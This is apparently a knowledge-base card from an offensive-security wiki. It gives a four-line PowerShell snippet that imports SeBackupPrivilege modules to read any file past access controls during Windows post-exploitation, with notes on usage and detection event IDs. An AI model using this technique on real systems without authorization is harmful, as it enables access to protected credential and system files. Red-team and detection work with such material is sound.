---
id: 11b43383-659c-43ea-a695-eb2ed41f3516
name: enable-sebackupprivilege-powershell
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:06.525760+00:00'
updated_at: '2023-04-10T20:26:17.816023+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - backup-privilege
validated: true
---

# enable-sebackupprivilege-powershell

## Code

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

## Description

This PowerShell code imports custom modules for SeBackupPrivilege manipulation and enables the privilege for the current process, followed by a status check. It grants the ability to read any file bypassing ACLs, useful in Windows post-exploitation for accessing protected resources.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Module paths | Paths to the DLL files (adjust based on location) | .\SeBackupPrivilegeUtils.dll |

## Usage

Execute in an elevated PowerShell session after confirming Backup Operators membership. Use before file copy or registry access operations in procedures like [[procedures/Abusing-Backup-Operators-Group-for-Sensitive-File-Access]]. Download modules from trusted security repos like GitHub.

## Detection

- Monitor PowerShell module imports for unsigned DLLs (Event ID 4104).
- Audit privilege adjustments (Event ID 4673 for SeBackupPrivilege enablement).
- Process monitoring for unusual PowerShell child processes accessing system files.

## Related

- [[procedures/Abusing-Backup-Operators-Group-for-Sensitive-File-Access]]
- [[PowerSploit-Tools]]
